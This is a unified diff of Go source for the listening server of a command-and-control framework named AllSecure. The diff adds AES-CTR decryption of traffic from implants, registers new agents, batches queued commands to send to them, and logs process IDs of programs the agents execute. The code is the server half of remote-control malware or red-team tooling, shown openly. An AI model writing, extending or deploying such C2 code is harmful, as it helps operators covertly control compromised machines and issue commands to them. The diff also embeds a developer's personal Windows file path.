@@ -9,6 +9,8 @@ import (
 	"AllSecure/ListeningServer/Common"
 	"AllSecure/TeamServer/Crypt"
 	"context"
+	"crypto/aes"
+	"crypto/cipher"
 	"github.com/gin-gonic/gin"
 	"io"
 	"log"
@@ -59,7 +61,7 @@ func ProcessRequest(c *gin.Context) {
 
 		}
 
-		decryptedPayload, AESKey, IV, err = Crypt.AESDecryptPayload(data_package, "C:\\Users\\Brendan Ortiz\\Documents\\GOProjcets\\AllSecure\\")
+		decryptedPayload, AESKey, IV, err = AESDecryptPayload(data_package, "C:\\Users\\Brendan Ortiz\\Documents\\GOProjcets\\AllSecure\\")
 		if err != nil {
 			log.Println("[error] attempting to decrypt payload")
 			c.JSON(http.StatusInternalServerError, "Internal Server Error")
@@ -112,10 +114,11 @@ func ProcessRequest(c *gin.Context) {
 
 		if len(agent_map) == 0 { // we have a nil map yet we're trying to get a job need to register.
 			// we would hit this when the listening server comes up AFTER the implant is running / reaching out already.
-
 			AgentCmd.CmdID = Common.CMD_Register
 			AgentCmd.RequestID = data_package.RequestID + 1
+			AgentCmd.Size = 0
 			AgentCmd.DataBuffer = nil
+			AgentCmd.MagicValue = data_package.MagicVal
 
 			agent = &Common.Implant{
 				AESKey:  nil,
@@ -140,38 +143,46 @@ func ProcessRequest(c *gin.Context) {
 		}
 
 		if agent_map[data_package.AgentName].AESKey != nil && agent_map[data_package.AgentName].IV != nil {
-			//TODO DO SOMETHING WITH DECRYPTED DATA
 
 			decryptedPayload = Crypt.AES256CTR(data_package.EncryptedData, agent_map[data_package.AgentName].AESKey, agent_map[data_package.AgentName].IV)
 			ParseDataPackage(decryptedPayload, data_package.AgentName)
+
 		}
 
 		agent = agent_map[data_package.AgentName]
 		if agent.CmdQue.Len() == 0 {
 			AgentCmd.CmdID = Common.CMD_NO_JOB
 			AgentCmd.RequestID = data_package.RequestID + 1
-			c.Data(http.StatusOK, "application/octet-stream", AgentCmd.MarshalAgentCmd())
+			AgentCmd.MagicValue = agent.Context.Magic_val
+			AgentCmd.DataBuffer = nil
+			AgentCmd.Size = 0
+			c.Data(http.StatusOK, "application/octet-stream", AgentCmd.MarshalAgentCmd(agent))
 			agent.Context.LastCheckin = time.Now()
 
 		} else if agent.CmdQue.Len() > 0 {
 			var (
 				value interface{}
 				ok    bool
+				blob  []byte
 			)
-			agent.Context.LastCheckin = time.Now()
-			value, err = agent.CmdQue.Dequeue()
 
-			if err != nil {
-				log.Println("[error] attempting to dequeue agent command", err)
-				c.Data(http.StatusInternalServerError, "application/octet-stream", nil)
+			agent.Context.LastCheckin = time.Now()
+			for agent.CmdQue.Len() > 0 {
+				value, err = agent.CmdQue.Dequeue()
+				if err != nil {
+					log.Println("[error] attempting to dequeue agent command", err)
+					c.Data(http.StatusInternalServerError, "application/octet-stream", nil)
+				}
+				if AgentCmd, ok = value.(Common.AgentCmd); ok {
+					blob = append(blob, AgentCmd.MarshalAgentCmd(agent)...)
+				} else {
+					log.Println("[error] attempting to cast value to AgentCmd")
+					c.Data(http.StatusInternalServerError, "application/octet-stream", nil)
+				}
 			}
-			//TODO if there is multiple commands in the queue, we need to send them all
-			if AgentCmd, ok = value.(Common.AgentCmd); ok {
-				c.Data(http.StatusOK, "application/octet-stream", AgentCmd.MarshalAgentCmd())
-			} else {
-				log.Println("[error] attempting to cast value to AgentCmd")
-				c.Data(http.StatusInternalServerError, "application/octet-stream", nil)
-			}
+
+			c.Data(http.StatusOK, "application/octet-stream", blob)
+
 		}
 
 		SendEvent("UpdateCheckin", agent.Context, agent.Alive, nil) // update our last checkin no matter if we have a job to do or not.
@@ -322,7 +333,49 @@ func ParseDataPackage(decryptedPayload []byte, AgentName string) {
 			ParseDataPackage(DataPackage.Data, AgentName)
 		}
 		break
+
+	case Common.CMD_EXECUTE:
+		var ProcID uint32
+		ProcID = DataPackage.ReadInt32()
+		log.Println("Agent executed started process with procid [", ProcID, "]")
+		err = SendEvent("SendExecuteData", agent_map[AgentName].Context, agent_map[AgentName].Alive, ProcID)
+		if err != nil {
+			log.Println("[error] attempting to send execute data to client", err)
+		}
+		if len(DataPackage.Data) > 0 {
+			ParseDataPackage(DataPackage.Data, AgentName)
+		}
+		break
 	default:
 		break
 	}
+}
+
+func AESDecryptPayload(DataPackage Common.Package, filepath string) ([]byte, []byte, []byte, error) {
+	var (
+		err             error
+		DecryptedAESKey []byte
+		DecryptedIV     []byte
+	)
+
+	DecryptedAESKey, err = Crypt.DecryptKeyIV(DataPackage.EncryptedAESKey, filepath, DataPackage.AgentName)
+	if err != nil {
+		return []byte{}, []byte{}, []byte{}, err
+	}
+
+	DecryptedIV, err = Crypt.DecryptKeyIV(DataPackage.EncryptedIV, filepath, DataPackage.AgentName)
+	if err != nil {
+		return []byte{}, []byte{}, []byte{}, err
+	}
+
+	block, err := aes.NewCipher(DecryptedAESKey)
+	if err != nil {
+		log.Println("[error] attempting to create new aes block", err)
+		return []byte{}, []byte{}, []byte{}, err
+	}
+	stream := cipher.NewCTR(block, DecryptedIV)
+	plaintext := make([]byte, DataPackage.EncryptedDataSize)
+	stream.XORKeyStream(plaintext, DataPackage.EncryptedData)
+
+	return plaintext, DecryptedAESKey, DecryptedIV, nil
 }
